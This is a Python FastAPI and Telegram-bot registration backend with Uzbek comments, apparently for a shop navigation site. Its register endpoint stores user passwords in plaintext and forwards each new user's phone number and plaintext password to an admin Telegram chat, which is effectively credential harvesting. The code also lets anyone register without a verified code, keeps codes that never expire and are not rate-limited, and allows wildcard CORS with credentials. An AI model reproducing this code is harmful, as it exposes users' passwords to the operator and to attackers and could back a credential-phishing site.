import os
import sqlite3
import random
from typing import Optional
from fastapi import FastAPI, HTTPException, Request
from fastapi.middleware.cors import CORSMiddleware
from fastapi.staticfiles import StaticFiles
from fastapi.responses import HTMLResponse
from pydantic import BaseModel
import telebot

# --- SOZLAMALAR ---
BOT_TOKEN = "YOUR_TELEGRAM_BOT_TOKEN_HERE"  # BotFather'dan olingan token
ADMIN_CHAT_ID = "YOUR_TELEGRAM_CHAT_ID_HERE"  # Admin Telegram ID (masalan: 123456789)

app = FastAPI(title="Dokon Navigation API")
bot = telebot.TeleBot(BOT_TOKEN)

# CORS sozlamalari
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# --- DATABASE SOZLASH (SQLite) ---
DB_NAME = "database.db"

def init_db():
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()
    # Foydalanuvchilar jadvali
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            phone TEXT UNIQUE NOT NULL,
            password TEXT NOT NULL,
            created_at DATETIME DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    # Tasdiqlash kodlari jadvali
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS temp_codes (
            phone TEXT PRIMARY KEY,
            code TEXT NOT NULL
        )
    ''')
    conn.commit()
    conn.close()

init_db()

# Pydantic Modellari
class VerifyRequest(BaseModel):
    phone: str
    code: str

class RegisterRequest(BaseModel):
    phone: str
    password: str

# --- TELEGRAM BOT HANDLERLARI ---
@bot.message_handler(commands=['start'])
def send_welcome(message):
    markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
    btn = telebot.types.KeyboardButton(text="📱 Kontaktingizni yuboring", request_contact=True)
    markup.add(btn)
    bot.send_message(
        message.chat.id, 
        "Assalomu alaykum! Saytdan ro'yxatdan o'tish uchun pasdagi tugma orqali kontaktingizni yuboring.", 
        reply_markup=markup
    )

@bot.message_handler(content_types=['contact'])
def handle_contact(message):
    if message.contact is not None:
        phone = message.contact.phone_number
        if not phone.startswith('+'):
            phone = '+' + phone
        
        code = str(random.randint(100000, 999999))

        # Kodni bazada saqlash
        conn = sqlite3.connect(DB_NAME)
        cursor = conn.cursor()
        cursor.execute("INSERT OR REPLACE INTO temp_codes (phone, code) VALUES (?, ?)", (phone, code))
        conn.commit()
        conn.close()

        bot.send_message(
            message.chat.id,
            f"✅ Kontaktingiz qabul qilindi!\n\n🔑 Tasdiqlash kodingiz: <code>{code}</code>\n\nKodni saytga kiriting.",
            parse_mode="HTML"
        )

# Botni alohida thread'da yuritish
import threading
threading.Thread(target=bot.infinity_polling, daemon=True).start()

# --- API ENDPOINLARI ---

@app.post("/api/verify")
def verify_code(req: VerifyRequest):
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()

    # Nomer ro'yxatdan o'tganligini tekshirish
    cursor.execute("SELECT id FROM users WHERE phone = ?", (req.phone,))
    if cursor.fetchone():
        conn.close()
        raise HTTPException(status_code=400, detail="Sizning nomeringiz ro'yxatdan o'tgan!")

    # Kodni tekshirish
    cursor.execute("SELECT code FROM temp_codes WHERE phone = ?", (req.phone,))
    row = cursor.fetchone()
    conn.close()

    if row and row[0] == req.code:
        return {"success": True, "message": "Kod to'g'ri!"}
    else:
        raise HTTPException(status_code=400, detail="Kod noto'g'ri kiritildi!")

@app.post("/api/register")
def register_user(req: RegisterRequest):
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()

    try:
        cursor.execute("INSERT INTO users (phone, password) VALUES (?, ?)", (req.phone, req.password))
        cursor.execute("DELETE FROM temp_codes WHERE phone = ?", (req.phone,))
        conn.commit()
    except sqlite3.IntegrityError:
        conn.close()
        raise HTTPException(status_code=400, detail="Bu raqam allaqachon ro'yxatdan o'tgan!")
    
    conn.close()

    # Admin Telegramga bildirishnoma
    msg = (
        f"🎉 <b>Yangi foydalanuvchi ro'yxatdan o'tdi!</b>\n\n"
        f"📱 <b>Telefon:</b> <code>{req.phone}</code>\n"
        f"🔑 <b>Parol:</b> <code>{req.password}</code>"
    )
    try:
        bot.send_message(ADMIN_CHAT_ID, msg, parse_mode="HTML")
    except Exception as e:
        print(f"Telegram yuborishda xatolik: {e}")

    return {"success": True, "message": "Ro'yxatdan muvaffaqiyatli o'tdingiz!"}

# Ishga tushirish buyrug'i: uvicorn main:app --reload
